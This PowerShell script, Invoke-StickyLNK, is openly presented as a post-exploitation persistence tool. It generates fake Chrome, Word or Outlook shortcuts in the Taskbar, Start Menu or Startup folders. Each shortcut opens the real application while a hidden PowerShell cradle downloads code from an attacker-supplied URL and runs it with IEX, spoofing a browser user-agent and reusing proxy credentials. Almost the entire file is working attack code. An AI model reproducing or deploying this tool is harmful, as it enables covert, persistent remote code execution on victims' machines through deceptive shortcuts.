<#
    Invoke-StickLNK is a .LNK generation tool that is used for post-exploitation
    user-drive persistence. Replace common shortcuts on the system with an embedded powershell cradles.

    Author: @bSpence7337
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

#>

function Invoke-StickyLNK
{
<# 
.DESCRIPTION

Invoke-StickyLNK function will generate a .LNK shortcut with an embedded powershell cradle for user-driven persistence.

.PARAMETER URL

Specifies the Url of the staged payload to be downloaded and invoked by the remote download cradle payload.

.PARAMETER AppName

Specify the application you wish to simulate for .LNK creation. Currently Winword.exe, Chrome.exe, and Outlook.exe are built-in. Must Use -LNKName if one of these is not used. The AppName must be a valid and existing executable.

.PARAMETER LNKNameInput

If AppName is not Winword.exe, Chrome.exe, Outlook.exe, specify the name of the LNK file. ex. "Excel 2013.lnk"

.PARAMETER Type

Specify Taskbar, StartMenu, or Startup to determine the save location of the .Lnk.

#>
    Param(
        [Parameter(Mandatory=$True)]
        [string]$URL,

        [Parameter(Mandatory=$True)]
        [string]$AppName,

        [string]$LNKNameInput,

        [Parameter(Mandatory=$True)]
        [ValidateScript({
            If ($_ -eq 'Taskbar' -Or $_ -eq 'StartMenu' -Or $_ -eq 'Startup' ) {
                $True
            }
            else {
                Throw "$_ is not a valid -Type. Use Taskbar, StartMenu, or Startup"
            }
        })]
        [string]$Type
    )

If ($Type -eq 'Taskbar')  {
    $TypeLocation = "$Env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
  }
ElseIf ($Type -eq 'StartMenu')  {
    $TypeLocation = "$Env:APPDATA\Microsoft\Windows\Start Menu"
  }
ElseIf ($Type -eq 'Startup')  {
    $TypeLocation = "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
  }  

If ($AppName -eq 'chrome.exe')  {
    $LNKName = "$TypeLocation\Google Chrome.lnk" 
  }
ElseIf ($AppName -eq 'winword.exe')  {
    $LNKName = "$TypeLocation\Word 2013.lnk" 
  }
ElseIf ($AppName -eq 'outlook.exe')  {
    $LNKName = "$TypeLocation\Outlook 2013.lnk" 
  }
Else { 
    $LNKName = $TypeLocation + "\" + $LNKNameInput
  }  
    $IconPath = dir -Path C:\ -Filter $AppName -Recurse -EA SilentlyContinue | %{$_.FullName} | Select-Object -first 1 
if ($IconPath -eq $null) {
    Throw "$AppName is not a valid executable on this system."
  }
    $BinaryPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    $Arguments = "-nop -w hidden -c `Start-Process " + $AppName + "; `$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$URL'))"
    $obj = New-Object -COM WScript.Shell
    $link = $obj.CreateShortcut($LNKName)
    $link.WindowStyle = '7'
    $link.TargetPath = $BinaryPath
    $link.Arguments = $Arguments
    $link.IconLocation = "$IconPath, 0";
    $link.Save()
}
